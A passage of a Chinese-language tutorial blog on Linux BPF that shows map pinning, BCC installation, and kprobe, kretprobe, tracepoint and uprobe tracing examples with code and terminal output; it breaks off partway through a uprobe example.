class="line">[root@VM-16-14-centos cpt2]# ./save</span><br></pre></td></tr></table></figure><p>在程序执行结束后，再次检查该路径下是否有一个新文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt2]# ls -la /sys/fs/bpf/</span><br><span class="line">total 0</span><br><span class="line">drwx-----T 2 root root 0 May 25 16:15 .</span><br><span class="line">drwxr-xr-x 6 root root 0 May 16 20:00 ..</span><br><span class="line">-rw------- 1 root root 0 May 25 16:15 my_array</span><br></pre></td></tr></table></figure><p>接着我们可以编写一个类似的程序，从文件系统加载该映射并打印我们插入的元素。 这样我们就可以验证是否正确保存了映射：</p><p><code>map_pinning_fetch.c</code>程序如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"bpf.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *file_path = <span class="string">"/sys/fs/bpf/my_array"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd, key, value, result;</span><br><span class="line"></span><br><span class="line">  fd = bpf_obj_get(file_path);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to fetch the map: %d (%s)\n"</span>, fd, strerror(errno));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  key = <span class="number">1</span>;</span><br><span class="line">  result = bpf_map_lookup_elem(fd, &amp;key, &amp;value);</span><br><span class="line">  <span class="keyword">if</span> (result &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to read value from the map: %d (%s)\n"</span>, result,</span><br><span class="line">           strerror(errno));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Value read from the map: '%d'\n"</span>, value);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译并执行，结果如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt2]# make fetch</span><br><span class="line">clang -o fetch -lelf -I/root/linux-5.4/tools/lib/bpf -L/usr/local/lib64 -lbpf map_pinning_fetch.c</span><br><span class="line">[root@VM-16-14-centos cpt2]# ./fetch </span><br><span class="line">Value read from the map: '1234'</span><br></pre></td></tr></table></figure><p>将BPF对象保存在文件系统中使得数据和程序不再依赖于单个执行线程。信息可以由不同的应用程序共享，BPF程序甚至可以在创建它们的应用程序终止后运行。这为它们提供了额外的级别或可用性，如果没有BPF文件系统，完成这些操作是不可能的。</p><h3 id="结论-1"><a href="#结论-1" class="headerlink" title="结论"></a>结论</h3><p>在内核和用户空间之间建立通信通道是充分利用BPF程序的基础。 在本章中，我们学习了如何创建BPF映射来建立这种通信以及如何使用它们。我们还描述了可以在程序中使用的映射类型。 接着我们学习到了更具体的映射示例。最后我们学习了如何将整个映射固定到系统中，以使得它们所保存的信息能够经受住崩溃和中断的影响。</p><p>BPF映射是内核和用户空间之间通信的中心总线。在本章中，我们建立了理解它们所需的基本概念。在下一章中，我们将更广泛地使用这些数据结构来共享数据。我们还会介绍一些其他工具，这些工具将使BPF映射的使用更加高效。</p><p>在下一章中将看到BPF程序和映射如何协同工作，从内核的角度为你提供系统上的跟踪功能。 我们探索了将程序附加到内核中不同入口点的不同方法。最后，我们将介绍如何以一种使应用程序更易于调试和观察的方式表示多个数据点。</p><h2 id="第四章节"><a href="#第四章节" class="headerlink" title="第四章节"></a>第四章节</h2><h3 id="使用-BPF-进行跟踪"><a href="#使用-BPF-进行跟踪" class="headerlink" title="使用 BPF 进行跟踪"></a>使用 BPF 进行跟踪</h3><p>在软件工程领域，跟踪是一种通过收集数据进行分析和调试的方法。目标是在运行时提供有用的信息以供将来分析。使用BPF进行跟踪的主要优点是可以访问来自Linux内核和应用程序的任何信息。与其他跟踪技术相比，BPF减少了系统性能和延迟，并且不需要开发人员为了从应用程序收集数据而修改他们的应用程序。</p><p>Linux内核提供了多种可与BPF结合使用的检测功能。在本章我们将讨论这些不同的功能。我们将展示内核如何在操作系统中暴露这些功能，以便你知道如何找到可用于BPF程序的信息。</p><p>跟踪的最终目标是通过获取所有可用数据并以有用的方式呈现，从而让你更加深入的了解系统。 我们将讨论几种不同的数据表示以及如何在不同的场景中使用它们。</p><p>从本章开始，我们将使用一种强大的工具包来编写BPF程序，BPF编译收集器(BCC)。BCC 是一组使构建BPF程序更可预测的组件。即使你掌握了<code>Clang</code>和<code>LLVM</code>，你也不想花费不必要的时间来构建相同的实用程序，除此之外还要确保BPF验证器不会拒绝你编写的程序。BCC为常见结构（如<code>Perf</code>事件映射）提供可重用组件，并与<code>LLVM</code>后端集成以提供更好的调试选项。最重要的是，BCC包括多种编程语言的绑定， 我们将在示例中使用<code>Python</code>。 这些绑定允许你用高级语言编写BPF程序的用户空间部分，从而产生更有用的程序。我们还在后面的章节中使用BCC来使示例代码更加简洁。</p><p>BCC工具安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install bcc-tools</span><br></pre></td></tr></table></figure><p>BCC工具安装在<code>/usr/share/bcc/tools/</code>目录中。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# ll /usr/share/bcc/tools/</span><br><span class="line">total 1012</span><br><span class="line">-rwxr-xr-x 1 root root 34678 Jul 16  2021 argdist</span><br><span class="line">-rwxr-xr-x 1 root root  2413 Jul 16  2021 bashreadline</span><br><span class="line">-rwxr-xr-x 1 root root 16209 Jul 16  2021 bindsnoop</span><br><span class="line">-rwxr-xr-x 1 root root  6774 Jul 16  2021 biolatency</span><br><span class="line">-rwxr-xr-x 1 root root  9979 Jul 16  2021 biolatpcts</span><br><span class="line">-rwxr-xr-x 1 root root  5776 Jul 16  2021 biosnoop</span><br><span class="line">-rwxr-xr-x 1 root root  6687 Jul 16  2021 biotop</span><br><span class="line">-rwxr-xr-x 1 root root  1170 Jul 16  2021 bitesize</span><br><span class="line">-rwxr-xr-x 1 root root  2612 Jul 16  2021 bpflist</span><br><span class="line">-rwxr-xr-x 1 root root  4728 Jul 16  2021 cachestat</span><br><span class="line">-rwxr-xr-x 1 root root  7312 Jul 16  2021 cachetop</span><br><span class="line">-rwxr-xr-x 1 root root  8436 Jul 16  2021 capable</span><br><span class="line">-rwxr-xr-x 1 root root    57 Jul 16  2021 cobjnew</span><br><span class="line">-rwxr-xr-x 1 root root 11181 Jul 16  2021 compactsnoop</span><br><span class="line">-rwxr-xr-x 1 root root  5272 Jul 16  2021 cpudist</span><br><span class="line">-rwxr-xr-x 1 root root 14608 Jul 16  2021 cpuunclaimed</span><br><span class="line">-rwxr-xr-x 1 root root  7402 Jul 16  2021 dbslower</span><br><span class="line">-rwxr-xr-x 1 root root  3794 Jul 16  2021 dbstat</span><br><span class="line">-rwxr-xr-x 1 root root  3963 Jul 16  2021 dcsnoop</span><br><span class="line">-rwxr-xr-x 1 root root  3931 Jul 16  2021 dcstat</span><br><span class="line">-rwxr-xr-x 1 root root 19972 Jul 16  2021 deadlock</span><br></pre></td></tr></table></figure><p>能够在Linux内核中跟踪程序的第一步是确定它为你提供的附加BPF程序的扩展点。这些扩展点通常称为探针(probes)。</p><h4 id="探针"><a href="#探针" class="headerlink" title="探针"></a>探针</h4><p>英语词典中对探针一词的定义之一如下：</p><p>一种无人探索航天器，旨在传输有关其环境的信息。</p><p>这个定义在我们脑海中唤起了对科幻电影和史诗般的NASA任务的回忆。 当我们谈论跟踪探针时，我们可以使用非常相似的定义。</p><p>跟踪探针是探索性程序，旨在传输有关执行它们的环境的信息。</p><p>他们在你的系统中收集数据，供你探索和分析。传统上，在Linux中使用探针涉及编写编译到内核模块中的程序，这可能会导致生产系统中的灾难性问题。多年来，它们发展到执行起来很安全，但编写和测试仍然很麻烦。像<code>SystemTap</code>这样的工具建立了新的协议来编写探针。</p><p>BPF搭载跟踪探测来收集信息以进行调试和分析。BPF程序的安全性使得它们比依赖重新编译内核的工具更有吸引力。重新编译内核以包含外部模块可能会引起由于代码行为不当而导致崩溃的风险。BPF验证器通过在加载到内核之前分析程序来消除这种风险。BPF开发人员利用探针定义并修改内核，从而当代码执行找到其中一个定义时执行的是BPF程序而不是内核模块。</p><p>了解可以定义的不同类型的探针对于探索系统中发生的事情至关重要。在本节中，我们对不同的探针定义进行分类，如何在系统中发现它们，以及如何将BPF程序附着到它们。</p><p>在本章中，我们介绍了四种不同类型的探针：</p><ul><li><p>Kernel probes</p><p>这些使您可以动态访问内核中的内部组件</p></li><li><p>Tracepoints</p><p>这些提供对内核内部组件的静态访问</p></li><li><p>User-space probes</p><p>这些使您可以动态访问在用户空间中运行的程序</p></li><li><p>User statically defined tracepoints</p><p>这些允许静态访问在用户空间中运行的程序</p></li></ul><p>接下来让我们从内核探针开始详细的学习</p><h3 id="Kernel-probes"><a href="#Kernel-probes" class="headerlink" title="Kernel probes"></a>Kernel probes</h3><p>内核探针允许你在几乎任何内核指令中以最小的开销设置动态标志或中断。当内核到达这些标志之一时，它会执行附加到探针的代码，然后恢复其正常例程。内核探针可以为你提供有关系统中发生的任何事情的信息，例如系统中打开的文件和正在执行的二进制文件。关于内核探针需要记住的重要一点是它们没有稳定的应用程序二进制接口 (ABI)，这意味着它们可能会在内核版本之间发生变化。如果你尝试将相同的探测器附加到具有两个不同内核版本的两个系统，则相同的代码可能会停止工作。</p><p>内核探针分为两类：<code>kprobes</code>和<code>kretprobes</code>。 它们的使用取决于你在执行周期中插入BPF程序的位置。 本节将指导你如何使用它们中的每一个将BPF程序附加到这些探针并从内核中提取信息。</p><h4 id="Kprobes"><a href="#Kprobes" class="headerlink" title="Kprobes"></a>Kprobes</h4><p><code>Kprobes</code>允许你在执行任何内核指令之前插入BPF程序。你需要知道你想要破解的函数签名，正如我们之前提到的，这不是一个稳定的ABI，所以如果你要运行相同的程序，你需要在不同的内核版本中小心设置这些探针。 当内核执行到达你设置探针的指令时，它会避开你的代码，运行你的BPF程序，并将执行返回到原始指令。</p><p>为了展示如何使用<code>kprobes</code>，我们将编写一个BPF程序，该程序打印系统中执行的任何二进制文件的名称。在本例中，我们将为BCC工具使用Python前端，但你可以使用任何其他BPF工具编写它：</p><p><code>kprobes.py</code>代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""1</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">int do_sys_execve(struct pt_regs *ctx) &#123;</span></span><br><span class="line"><span class="string">  char comm[16];</span></span><br><span class="line"><span class="string">  bpf_get_current_comm(&amp;comm, sizeof(comm));</span></span><br><span class="line"><span class="string">  bpf_trace_printk("executing program: %s\\n", comm);</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf = BPF(text=bpf_source)<span class="number">2</span></span><br><span class="line">execve_function = bpf.get_syscall_fnname(<span class="string">"execve"</span>)<span class="number">3</span></span><br><span class="line">bpf.attach_kprobe(event=execve_function, fn_name=<span class="string">"do_sys_execve"</span>)</span><br><span class="line">bpf.trace_print()<span class="number">4</span></span><br></pre></td></tr></table></figure><p>1：BPF程序开始执行，辅助函数<code>bpf_get_current_comm</code>将获取内核正在运行的当前命令的名称，并将其存储在我们的<code>comm</code>变量中。我们将其定义为固定长度数组，因为内核对命令名称有16个字符的限制。获得命令名称后，我们将其打印在调试跟踪中，这样运行Python脚本的人就可以看到BPF捕获的所有命令。</p><p>2：加载BPF程序到内核中</p><p>3：将程序与<code>execve</code>系统调用相关联。这个系统调用的名称在不同的内核版本中发生了变化，并且BCC提供了一个函数来检索这个名称，而无需记住你正在运行的内核版本。</p><p>4：该代码输出跟踪日志，因此你可以看到使用该程序跟踪的所有命令。</p><p>执行结果如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# python3 kprobes.py </span><br><span class="line">b'     barad_agent-1950607 [000] d..31 829823.592341: bpf_trace_printk: executing program: barad_agent'</span><br><span class="line">b''</span><br><span class="line">b'              sh-1950610 [000] d..31 829823.594794: bpf_trace_printk: executing program: sh'</span><br><span class="line">b''</span><br><span class="line">b'              sh-1950609 [000] d..31 829823.595494: bpf_trace_printk: executing program: sh'</span><br><span class="line">b''</span><br><span class="line">b'              sh-1950608 [000] d..31 829823.597752: bpf_trace_printk: executing program: sh'</span><br><span class="line">b''</span><br><span class="line">b'     barad_agent-1950614 [000] d..31 829826.591153: bpf_trace_printk: executing program: barad_agent'</span><br><span class="line">b''</span><br><span class="line">b'              sh-1950614 [000] d..31 829826.592741: bpf_trace_printk: executing program: sh'</span><br><span class="line">b''</span><br><span class="line">b'     barad_agent-1950615 [000] d..31 829826.594348: bpf_trace_printk: executing program: barad_agent'</span><br><span class="line">b''</span><br><span class="line">b'              sh-1950617 [000] d..31 829826.595978: bpf_trace_printk: executing program: sh'</span><br><span class="line">b''</span><br><span class="line">b'              sh-1950616 [000] d..31 829826.597514: bpf_trace_printk: executing program: sh'</span><br><span class="line">b''</span><br><span class="line">b'     barad_agent-1950620 [000] d..31 829827.593496: bpf_trace_printk: executing program: barad_agent''</span><br></pre></td></tr></table></figure><h4 id="Kretprobes"><a href="#Kretprobes" class="headerlink" title="Kretprobes"></a>Kretprobes</h4><p>当内核指令在执行后返回一个值时，<code>Kretprobes</code>将插入你的BPF程序。通常，你会希望将<code>kprobes</code>和<code>kretrobes</code>组合到一个BPF程序中，以便全面了解指令的行为。</p><p>我们将使用与上一节中的示例类似的示例来展示<code>kretprobes</code>的工作原理：</p><p><code>kretprobes.py</code>代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">int ret_sys_execve(struct pt_regs *ctx) &#123;1</span></span><br><span class="line"><span class="string">  int return_value;</span></span><br><span class="line"><span class="string">  char comm[16];</span></span><br><span class="line"><span class="string">  bpf_get_current_comm(&amp;comm, sizeof(comm));</span></span><br><span class="line"><span class="string">  return_value = PT_REGS_RC(ctx);</span></span><br><span class="line"><span class="string">  bpf_trace_printk("program: %s, return: %d\\n", comm, return_value);</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf = BPF(text=bpf_source)<span class="number">2</span></span><br><span class="line">execve_function = bpf.get_syscall_fnname(<span class="string">"execve"</span>)</span><br><span class="line">bpf.attach_kretprobe(event=execve_function, fn_name=<span class="string">"ret_sys_execve"</span>)<span class="number">3</span></span><br><span class="line">bpf.trace_print()</span><br></pre></td></tr></table></figure><p>1：定义实现BPF程序的函数。 内核将在<code>execve</code>系统调用完成后立即执行它。 <code>PT_REGS_RC</code>是一个宏，它将从BPF寄存器中读取此特定上下文的返回值。我们还使用<code>bpf_trace_printk</code>在调试日志中打印命令及其返回值</p><p>2：初始化BPF程序并将其加载到内核中</p><p>3：将附着函数更改为<code>attach_kretprobe</code></p><p>执行结果如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# python3 kretprobes.py </span><br><span class="line">b'              sh-1953793 [000] dN.31 831223.599284: bpf_trace_printk: program: sh, return: 0'</span><br><span class="line">b''</span><br><span class="line">b'             awk-1953796 [000] dN.31 831223.601352: bpf_trace_printk: program: awk, return: 0'</span><br><span class="line">b''</span><br><span class="line">b'            grep-1953795 [000] dN.31 831223.602648: bpf_trace_printk: program: grep, return: 0'</span><br><span class="line">b''</span><br><span class="line">b'             cat-1953794 [000] dN.31 831223.604214: bpf_trace_printk: program: cat, return: 0'</span><br><span class="line">b''</span><br><span class="line">b'              sh-1953798 [000] d..31 831226.598533: bpf_trace_printk: program: sh, return: 0'</span><br><span class="line">b''</span><br><span class="line">b'             cat-1953798 [000] d..31 831226.599918: bpf_trace_printk: program: cat, return: 0'</span><br><span class="line">b''</span><br><span class="line">b'              sh-1953799 [000] dN.31 831226.601655: bpf_trace_printk: program: sh, return: 0'</span><br><span class="line">b''</span><br><span class="line">b'             awk-1953801 [000] dN.31 831226.603102: bpf_trace_printk: program: awk, return: 0'</span><br><span class="line">b''</span><br><span class="line">b'             cat-1953800 [000] dN.31 831226.604683: bpf_trace_printk: program: cat, return: 0'</span><br></pre></td></tr></table></figure><p>内核探针是访问内核的一种强大方法。但正如我们之前提到的，它们可能不太稳定，因为你附着到内核源代码中的动态点，这些动态点可能会从一个版本更改或消失到另一个版本。因此我们需要一种更安全的将程序附着到内核的方法。</p><h3 id="Tracepoints"><a href="#Tracepoints" class="headerlink" title="Tracepoints"></a>Tracepoints</h3><p>跟踪点是内核代码中的静态标记，可用于将代码附着到正在运行的内核中。与<code>kprobe</code>的主要区别在于，它们是由内核开发人员在实现内核更改时编写的；这就是为什么我们将它们称为静态的。因为它们是静态的，所以跟踪点的ABI更稳定；内核始终保证旧版本中的跟踪点将存在于新版本中。但是，鉴于开发人员需要将它们添加到内核中，它们可能不会涵盖构成内核的所有子系统。</p><p>正如我们在之前提到的，你可以通过列出<code>/sys/kernel/debug/tracing/events</code>中的所有文件来查看系统中所有可用的跟踪点。</p><p>该输出中列出的每个子目录都对应一个跟踪点，我们可以将BPF程序附着到该跟踪点。但是那里还有两个附加文件。<code>enable</code>文件允许你启用和禁用BPF子系统的所有跟踪点。 如果文件内容为0，则禁用跟踪点；如果文件的内容为1，则启用跟踪点。<code>filter</code>文件允许你编写内核中的Trace子系统将用于过滤事件的表达式。</p><p>编写BPF程序利用跟踪点类似于使用<code>kprobes</code>进行跟踪。 这是一个使用BPF程序来跟踪系统中加载其他BPF程序的所有应用程序的示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">int trace_bpf_prog_load(void ctx) &#123;1</span></span><br><span class="line"><span class="string">  char comm[16];</span></span><br><span class="line"><span class="string">  bpf_get_current_comm(&amp;comm, sizeof(comm));</span></span><br><span class="line"><span class="string">  bpf_trace_printk("%s is loading a BPF program", comm);</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf = BPF(text = bpf_source)</span><br><span class="line">bpf.attach_tracepoint(tp = <span class="string">"bpf:bpf_prog_load"</span>, fn_name = <span class="string">"trace_bpf_prog_load"</span>)<span class="number">2</span></span><br><span class="line">bpf.trace_print()</span><br></pre></td></tr></table></figure><p>1：声明定义BPF程序的函数</p><p>2：该程序的主要区别在于：我们不是将程序附着到<code>kprobe</code>，而是将其附着到跟踪点。 BCC遵循命名跟踪点的约定； 首先，需要指定要跟踪的子系统（在本例中为bpf），后跟一个冒号，然后是子系统中的跟踪点 <code>pbf_prog_load</code>。 这意味着每次内核执行函数<code>bpf_prog_load</code>时，这个程序都会接收到事件，并打印出正在执行 <code>bpf_prog_load</code>指令的应用程序的名称。</p><p>内核探针和跟踪点使你能够完全访问内核。我们建议你尽可能使用跟踪点，但不要仅仅因为跟踪点更安全而坚持使用跟踪点。利用内核探针的动态特性。在下一节中，我们将讨论如何在用户空间运行的程序中获得类似级别的可见性。</p><h3 id="User-Space-Probes"><a href="#User-Space-Probes" class="headerlink" title="User-Space Probes"></a>User-Space Probes</h3><p>用户空间探针允许你在用户空间运行的程序中设置动态标志。它们相当于内核探针，用于检测在内核外运行的程序。当你定义一个<code>uprobe</code>时，内核会在附加的指令周围创建一个陷阱。 当你的应用程序到达该指令时，内核会触发一个事件，该事件将你的探测函数作为回调函数。<code>Uprobes</code>还允许你访问程序链接到的任何库，如果你知道指令的正确名称，就可以跟踪这些调用。</p><p>像内核探针一样，用户空间探针也分为两类，<code>uprobes</code>和<code>uretprobes</code>，这取决于你在程序执行周期中插入BPF程序的位置。 让我们直接看一些例子。</p><h4 id="uprobes"><a href="#uprobes" class="headerlink" title="uprobes"></a>uprobes</h4><p>一般来说，<code>uprobes</code>是内核在执行特定指令之前插入到程序指令集中的钩子。将<code>uprobes</code>附加到同一程序的不同版本时需要小心，因为函数签名可能会在这些版本之间内部发生变化。保证BPF程序在两个不同版本中运行的唯一方法是确保签名没有更改。你可以在Linux中使用命令<code>nm</code>列出ELF目标文件中包含的所有符号，这是检查你正在跟踪的指令是否仍然存在程序中的好办法，例如：</p><p><code>main.go</code>程序如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">    fmt.Println(<span class="string">"Hello, BPF"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着使用<code>go build -o hello-bpf main.go</code>编译这个Go程序。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# go build -o hello-bpf main.go</span><br></pre></td></tr></table></figure><p>最后使用命令<code>nm</code>获取有关二进制文件包含的所有指令点的信息。<code>nm</code>是GNU开发工具中包含的一个程序，它列出了目标文件中的符号。 如果你过滤名称中带有<code>main</code>的符号，会得到一个类似如下的列表：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# nm hello-bpf | grep main</span><br><span class="line">0000000000535ec0 D main..inittask</span><br><span class="line">0000000000497640 T main.main</span><br><span class="line">0000000000434d20 T runtime.main</span><br><span class="line">000000000045e440 T runtime.main.func1</span><br><span class="line">000000000045e4a0 T runtime.main.func2</span><br><span class="line">000000000054ab50 B runtime.main_init_done</span><br><span class="line">00000000004d8828 R runtime.mainPC</span><br><span class="line">0000000000578210 B runtime.mainStarted</span><br></pre></td></tr></table></figure><p>现在你有了一个符号列表，可以跟踪它们何时执行，甚至在执行相同二进制文件的不同进程之间。</p><p>为了跟踪我们之前的 Go 示例中的 main 函数何时执行，我们将编写一个 BPF 程序，并将其附加到一个 uprobe，该 uprobe 将在任何进程调用该指令之前中断：</p><p><code>uprobes.py</code>程序如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">int trace_go_main(struct pt_regs *ctx) &#123;</span></span><br><span class="line"><span class="string">  u64 pid = bpf_get_current_pid_tgid();</span></span><br><span class="line"><span class="string">  bpf_trace_printk("New hello-bpf process running with PID: %d\\n", pid);1</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf = BPF(text = bpf_source)</span><br><span class="line">bpf.attach_uprobe(name = <span class="string">"./hello-bpf"</span>, sym = <span class="string">"main.main"</span>, fn_name = <span class="string">"trace_go_main"</span>)<span class="number">2</span></span><br><span class="line">bpf.trace_print()</span><br></pre></td></tr></table></figure><p>1：使用函数<code>bpf_get_current_pid_tgid</code>来获取运行我们的<code>hello-bpf</code>程序的进程的进程标识符 (PID)。</p><p>2：将此程序附着到<code>uprobe</code>。 这个调用需要知道我们要跟踪的对象<code>hello-bpf</code>是对象文件的绝对路径。它还需要我们在对象内部跟踪的符号，在本例中为<code>main.main</code>，以及我们要运行的BPF程序。 这样，每当有人在我们的系统中运行<code>hello-bpf</code>时，我们都会在跟踪管道中获得一个新日志。</p><p>首先执行<code>hello-bpf</code>程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br><span 